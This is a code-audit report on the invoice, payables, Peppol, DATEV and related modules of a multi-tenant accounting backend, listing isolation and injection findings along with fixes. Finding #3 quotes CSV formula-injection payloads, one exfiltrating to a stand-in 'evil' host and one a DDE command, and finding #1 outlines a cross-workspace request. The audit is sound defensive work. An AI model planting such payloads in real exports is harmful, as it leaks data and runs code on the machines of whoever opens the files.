# Group 5 — invoices, payables, e-invoices, peppol, business-profile, branches, smb, datev

Code read at origin/main 43af3ca7 (audit worktree). All paths below are relative to `backend/src/` unless stated. Every controller, service, scheduler, helper and the entities they touch were read in full except where listed under "Not checked".

## Findings

| Severity | Confidence | Module | file:line | Title |
|---|---|---|---|---|
| HIGH | CONFIRMED | invoices | `modules/invoices/invoices.service.ts:526-549` (+ `117-119`, `270-279`) | Invoice line `categoryId` from the body is never checked against the workspace → stored A→B category reference in `invoice_line_items`, `credit_note_line_items` and `journal_lines` |
| MEDIUM | CONFIRMED | smb | `modules/smb/smb.service.ts:213,236-241` → `modules/mailer/mailer.service.ts:44-47` → `modules/application-settings/application-settings.service.ts:810-818` | `POST /invoices/:id/remind` resolves SMTP settings from the user's HOME workspace, not the open one |
| MEDIUM | CONFIRMED | payables | `modules/payables/payables-export.service.ts:363-381` | Payables CSV export does not neutralise spreadsheet formulas (`Vendor`, `Comment` straight into `sheet_to_csv`) |
| LOW | CONFIRMED | payables | `modules/payables/payables-export.service.ts:357-360` | Export written to a shared, predictable path `uploads/reports/payables-<ms>.csv`; same-millisecond exports from two workspaces collide |
| LOW | CONFIRMED | invoices (public) | `modules/invoices/public-invoices.service.ts:151-163`, `invoices.service.ts:308` | Share token never expires and cannot be rotated/revoked except by voiding the invoice; token is returned to every INVOICE_VIEW member |
| LOW | CONFIRMED | peppol | `modules/peppol/peppol.controller.ts:34-38`, `62-66` | `GET integrations/peppol/status` has no permission check (any member sees apiKeyId/companyId/lastError); `POST peppol/lookup` lets a viewer make outbound calls with the workspace's Recommand credentials |
| LOW | CONFIRMED | smb, branches | `modules/smb/smb.controller.ts:60`, `modules/branches/branches.controller.ts:327,336,347` | `:id` params without `ParseUUIDPipe` → Postgres `22P02` → 500 instead of 400 |
| LOW | CONFIRMED | datev | `modules/datev/datev.service.ts:285-300` | `GET /tax/datev/mapping` counts other members' private transactions (counts only; preview/export honour `canReadPrivate`) |
| LOW | LIKELY | datev | `modules/datev/datev-format.ts:183-191` | DATEV text fields are quoted but not formula-neutralised; a counterparty name starting with `=` is a live formula if the EXTF file is opened in Excel instead of DATEV |
| INFO | CONFIRMED | invoices, payables | `invoices.service.ts:192-196`, `credit-notes.service.ts`, `payables.service.ts:1334-1341` | `LIKE '%search%'` without escaping `%`/`_` (DoS-ish only) |

### 1. HIGH — invoice line `categoryId` not validated against the workspace

**Path:** `POST /invoices` (`@WorkspaceAuth(INVOICE_CREATE)`) → `InvoicesService.create` → `clientInWorkspace` (scoped) + `taxRatesInWorkspace` (scoped) → `buildDraft` → `replaceLineItems` which inserts `categoryId: item.categoryId ?? null` with no lookup at all. Same on `PUT /invoices/:id` (`update` → `replaceLineItems`). On `PUT /invoices/:id/send` the ids go to `postingLinesOf` → `LedgerPostingService.postInvoice` (`modules/ledger/ledger-posting.service.ts:274-283`), which calls `categoryAccountId(workspaceId, categoryId)` (scoped → returns `null` → generic sales account) **but still writes `categoryId: line.categoryId` into `journal_lines`**. `CreditNotesService.copyLines` (`credit-notes.service.ts:371`) copies the same id into `credit_note_line_items` and `postCreditNote` into `journal_lines` again. The recurring-invoice scheduler clones it too (`invoices.service.ts:156`).

**Exploit:** member of workspace A with `INVOICE_CREATE` knows (or obtains from any other leak) a category uuid of workspace B. `POST /invoices` with `X-Workspace-Id: A` and `lineItems: [{ description, quantity: 1, unitPrice: 100, categoryId: "<B category>" }]` → 201. `invoice_line_items.category_id` now references B's row (FK `ON DELETE SET NULL`), and after `send`, `journal_lines.category_id` does too. Any later join of `journal_lines`/`invoice_line_items` to `categories` by id that is not re-scoped will surface B's category name/type in A; B deleting its category silently nulls A's lines. I verified `categoryAccountId` and the ledger reports do **not** currently join categories unscoped, so today the impact is the stored cross-tenant reference (brief: HIGH), not a data read.

**Evidence:**
```ts
// invoices.service.ts:117-119
const client = await this.clientInWorkspace(workspaceId, dto.clientId);
await this.taxRatesInWorkspace(workspaceId, dto.lineItems);      // taxRateId only
// invoices.service.ts:536-547
await repo.insert(items.map((item, index) => ({ ..., taxRateId: item.taxRateId ?? null,
  categoryId: item.categoryId ?? null, ... })));
```
**Fix:** add `categoriesInWorkspace(workspaceId, lineItems)` next to `taxRatesInWorkspace` (count `In(ids)` + `workspaceId`, 404 on mismatch) and call it in `create` and `update`.
**Existing test:** no. `@tests/e2e/cross-workspace-references.e2e-spec.ts:131` covers only `taxRateId` ("does not price A’s invoice with B’s tax rate"); add the sibling case for `categoryId`.

### 2. MEDIUM — invoice reminder (`/invoices/:id/remind`) uses the user's home-workspace SMTP

**Path:** `InvoiceRemindersController.remind` (`@WorkspaceAuth(INVOICE_EDIT)`, `smb.controller.ts:54-63`) → `SmbService.sendInvoiceReminder(workspaceId, user, id)`. The invoice and client are loaded scoped (ok), but then:
```ts
// smb.service.ts:213
if (!(await this.mailerService.isConfigured(user))) { throw new ConflictException(...) }
// smb.service.ts:236-241
const sent = await this.mailerService.send({ to: client.email, subject, text, user });   // no workspaceId
```
`MailerService.send/isConfigured` → `ApplicationSettingsService.getSmtpSettings(user, undefined)` → `findSettings` → `requireWorkspaceId`:
```ts
// application-settings.service.ts:813
const workspaceId = requestWorkspaceId || user.workspaceId || user.lastWorkspaceId;
```
i.e. `users.workspace_id` = the HOME workspace, exactly the pattern the brief flags. `InvoiceDeliveryService.sendEmail` (the other mail path) does pass `workspaceId` (`invoice-delivery.service.ts:351-356`), so the two reminder features behave differently.

**Exploit/impact:** user U is owner of personal workspace A (SMTP configured with A's credentials/`from`) and member of company workspace B (own SMTP or none). With `X-Workspace-Id: B`, `POST /invoices/<B invoice>/remind` sends B's dunning mail to B's client through A's SMTP server and `from` address; B's own SMTP settings are ignored. Conversely, if only B has SMTP, U gets 409 "SMTP is not configured for this workspace" although it is. The audit event and `reminderCount` are written to B (correct), so the log and the actual sender disagree. Not a cross-tenant data read, but a wrong-tenant credential use.
**Fix:** `isConfigured(user, workspaceId)` and `send({ ..., user, workspaceId })` in `SmbService.sendInvoiceReminder`; or route it through `InvoiceDeliveryService.sendEmail` and drop the duplicate template.
**Existing test:** `@tests/e2e/smb.e2e-spec.ts:129` only asserts 409 without SMTP; nothing covers which workspace's SMTP is used. `smb.service.spec.ts` (unit) mocks the mailer.

### 3. MEDIUM — payables CSV export: spreadsheet formula injection

**Path:** `POST /payables/export` (`PAYABLE_VIEW`) → `PayablesService.exportData` → `PayablesExportService.exportPayables` → `xlsx.utils.json_to_sheet(rows)` → `sheet_to_csv`. Rows carry `Vendor: payable.vendor`, `Comment: payable.comment` verbatim. `vendor` is user text but also comes from external data: `source=statement` payables take the bank counterparty, and `InvoicesService.send` sets `vendor: client.name`. The repo's own neutraliser (`common/utils/spreadsheet-formula.util.ts`) is used by reports, storage and custom-tables exports but not here.
```ts
// payables-export.service.ts:363-381
const rows = payables.map(payable => ({ Vendor: payable.vendor, ..., Comment: payable.comment || '', ... }));
const csv = xlsx.utils.sheet_to_csv(worksheet);   // no neutralizeSpreadsheetFormulaCell
```
**Exploit:** a statement row (or a client name set by any member with CLIENT_EDIT) `=HYPERLINK("http://evil/?"&A1,"x")` / `=cmd|' /C calc'!A0` → whoever opens `payables-*.csv` in Excel executes it. The `.xlsx` branch writes string cells, so only the CSV format is affected.
**Fix:** map every string cell through `neutralizeSpreadsheetFormulaCell` (as `report-document.util.ts:121` does).
**Existing test:** no.

### 4. LOW — predictable shared export path

`payables-export.service.ts:357-360`: `uploads/reports/payables-${new Date().toISOString()}.${ext}`; the controller streams it and unlinks on close. Two exports from different workspaces in the same millisecond share one path: the second `writeFileSync` truncates/replaces what the first is streaming, and the first's cleanup unlinks the second's file. `uploads/reports` is **not** statically mounted (verified `common/utils/static-assets.util.ts`: only custom-field-icons, goal-covers, workspace-backgrounds, metal-photos), so it is a race, not a public read. Fix: `randomUUID()` in the name or stream the buffer directly without touching disk.

### 5. LOW — public share link: no expiry / rotation

`PublicInvoicesController` (`@Public()`, 30 req/min throttle, `X-Robots-Tag`, `no-store`) looks the invoice up by `shareToken` only (`public-invoices.service.ts:152`, unique column, 24 random bytes base64url minted at send — `invoices.service.ts:308`). The view hand-builds the payload (no ids/workspace), status comes from the receivable, VOID and soft-deleted invoices 404. What is exposed is what an invoice must show (issuer bank details, client name/address/taxId, line descriptions) and there is no payment-marking through the link. Gaps: the token never expires and the only revocation is voiding the invoice; the token is part of the normal `Invoice` entity so every INVOICE_VIEW member (viewer/accountant) can read and forward it; every unauthenticated hit bumps `view_count`. Hardening: an explicit "regenerate link" action and/or optional expiry; keep as is otherwise. `@tests/integration/invoices-lifecycle.spec.ts:517-573` covers the public view/pdf/paid status.

### 6. LOW — peppol status/lookup permission

`GET integrations/peppol/status` is `@UseGuards(WorkspaceContextGuard)` only (plus global JWT) — any member including viewer reads `apiKeyId`, `companyId`, `companyName`, `senderPeppolId`, `lastError`. The secret is `select: false` and only ever loaded through `withSecret` for calls; `connect` returns `status()` (e2e `peppol.e2e-spec.ts:213` asserts it never comes back). `POST peppol/lookup` is `INVOICE_VIEW`, so a read-only member can drive Recommand `/verify` calls with the workspace's key. Suggest `INTEGRATION_MANAGE`/`INVOICE_VIEW` for status and `INVOICE_EDIT` for lookup.

### 7. LOW — `:id` without `ParseUUIDPipe`

`smb.controller.ts:60` (`/invoices/:id/remind`) and `branches.controller.ts` (`findOne`/`update`/`remove`) pass raw strings to `findOne({ where: { id, workspaceId } })`; a non-uuid raises a Postgres cast error → 500. Scoping is intact (the `workspaceId` is still in the where), so this is noise/log pollution only.

### 8. LOW — DATEV mapping counts private rows

`datev.service.ts:285-300` groups `COUNT(*)` per category over all counted transactions of the workspace with no `canReadPrivate` filter, while `build()` (preview/export, `:435`) filters them. Leaks only "how many private rows per category exist" to a `REPORT_VIEW` member. Add the same owner filter or leave documented.

### 9. LOW/LIKELY — DATEV text not formula-neutralised

`datev-format.ts:183-191` strips control characters and doubles quotes (correct for DATEV import). The consumer is DATEV, not Excel, but the file is a `;`-CSV and users do open it in Excel; a bank counterparty starting with `=` becomes a formula there. Not verified in Excel; apply the neutraliser only if DATEV's importer tolerates a leading `'` (uncertain — hence LIKELY and LOW).

## Per-module verdicts

- **invoices (invoices/clients/credit-notes/settings/ageing/delivery/reminders/xrechnung/scheduler):** all 20 routes under `@WorkspaceAuth` with VIEW/CREATE/EDIT/DELETE matched to the action; every repository call carries `workspaceId` (invoice, client, tax rate, payable, journal entry, delivery, settings); `clientId` and `taxRateId` from the body are scoped; credit-note `applications[].invoiceId` resolved with `{id, workspaceId}` + row lock; PDFs are pdfmake (no HTML → no XSS/SSRF), stored as `bytea` with `select:false` and written via `update` so bytes never serialise; recurrence and reminder crons iterate `STANDARD_WORKSPACE` rows and pass the row's workspace. **One hole: line-item `categoryId` unscoped (HIGH #1).** Share link: LOW #5.
- **public-invoices:** clean apart from LOW #5 — token-only lookup on a unique 192-bit random column, throttled, hand-built view without ids, VOID/deleted → 404, no write path through the link.
- **payables (+scheduler, export, unbooked, listener):** 16 routes, all `@WorkspaceAuth`; `linkedTransactionId`, `statementId`, `payFromWalletId`, `categoryId`, `payableId` (allocate), `paymentId` (`{id, payableId, workspaceId}`) all validated against the workspace; raw SQL parameterised; scheduler excludes version workspaces and uses each row's `workspaceId`; export is read-only and `@AllowInVersion`. **Holes: CSV formula injection (MEDIUM #3), shared export path (LOW #4).**
- **e-invoices (reader/writers/zugferd/peppol-id):** clean — `fast-xml-parser` with `processEntities: false` (no XXE/entity expansion), attributes not parsed, hybrid-PDF attachment read via pdf-lib with a depth cap; XRechnung/UBL writers escape every text node and attribute; `parsePeppolId` regex is linear.
- **peppol:** clean on isolation — connection/transmission/inbound rows all keyed by `workspaceId`; `documentFor` resolves the invoice/credit note scoped; outbound host is the constant `https://app.recommand.eu` (no user URL → no SSRF); `apiSecret` encrypted at rest + `select:false`; no public inbound endpoint (inbox is polled with the workspace's own credentials and documents are written to that workspace as receipts, owner as actor); send is idempotent via the partial unique index. **LOW #6** (status without permission, lookup for viewers).
- **business-profile:** clean — GET `INVOICE_VIEW`, PUT/logo `WORKSPACE_SETTINGS_MANAGE`; `update` iterates `Object.entries(dto)` but `SchemaBody` decodes with `onExcessProperty: 'error'` so `workspaceId`/`logoFile` cannot be injected; logo: MIME allowlist (jpeg/png/webp/gif, no SVG), magic-byte check, random uuid name with extension from MIME, 2 MB cap; `@Public() GET logo/:fileName` uses `path.basename` + extension allowlist + `nosniff` (same trade as avatars; uuid is the secret). No external VAT lookup / egress in this module.
- **branches:** clean — 5 routes under BRANCH_* permissions, `WorkspaceCrudBaseService` scopes `findOne/update/remove` by `{id, workspaceId}`, create spreads only `name/code/address`. LOW #7 (no UUID pipe).
- **smb (reconciliation + reminder):** isolation clean — reconciliation reads are scoped, `confirm` goes through `PayablesService.markAsPaid` (payable and transaction scoped; e2e `smb.e2e-spec.ts:177` covers it). `smb` is "small business", not SMB/CIFS — there are no share credentials/hosts/paths in this module. **MEDIUM #2** (home-workspace SMTP), LOW #7.
- **datev:** clean on isolation — all 5 routes under REPORT_VIEW/REPORT_EXPORT(+TRANSACTION_VIEW); transactions, categories and settings queried by `workspaceId`; `accounts` keys validated as owned categories; `from`/`to` are `IsoDateString` bound as parameters, same-year enforced, 99 999-row cap; export honours private rows; file name derived from dates only. LOW #8, LOW #9.

## Not checked / uncertainty

- Did not run any test suite; all verdicts are from reading the code at 43af3ca7.
- `modules/smb/reconciliation.util.ts`, `modules/datev/datev-accounts.ts`, `modules/invoices/invoice-document.translations.ts`, `modules/e-invoices/einvoice-summary.ts`: skimmed as pure/static helpers, not line-by-line.
- `modules/receipts` processing of the Peppol XML after `createFromScan` (OCR/e-invoice branch) belongs to another group; I only confirmed the parser it uses (`einvoice-reader.ts`) is entity-safe.
- Finding #9 (DATEV + Excel) is a hypothesis about Excel's handling of quoted `="…"` cells; not reproduced.
- Workspace-isolation e2e sweeps (`workspace-isolation.e2e-spec.ts`, `workspace-isolation-sweep.e2e-spec.ts`) contain no cases for invoices, clients, credit notes, payables, branches, business-profile, datev or peppol routes — scoping there is verified by code reading only (plus the module-specific e2e/integration specs cited above).
